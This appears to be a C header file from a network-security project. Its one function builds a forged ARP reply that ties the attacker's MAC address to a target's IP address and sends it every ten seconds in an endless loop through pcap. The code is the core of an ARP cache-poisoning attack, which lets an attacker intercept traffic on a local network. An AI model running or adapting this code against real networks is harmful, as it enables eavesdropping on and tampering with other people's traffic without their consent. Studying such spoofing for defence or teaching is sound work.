#pragma once
#include "init.h"

void send_arp_reply(session ses);

void send_arp_reply(session ses)
{
    /* arp reply packet make*/
    u_char* reply_buf = arp_reply_maker(ses.attackerMAC, ses.targetIP, ses.senderMAC, ses.senderIP);

    /* send arp reply */
    while(true){
        int res = pcap_sendpacket(ses.handle, reply_buf, 42);
        if(res == -1) printf("Send ARP Reply Packet Error\n");
        else printf("Send Arp Reply Packet..\n");
        sleep(10);
    }

}

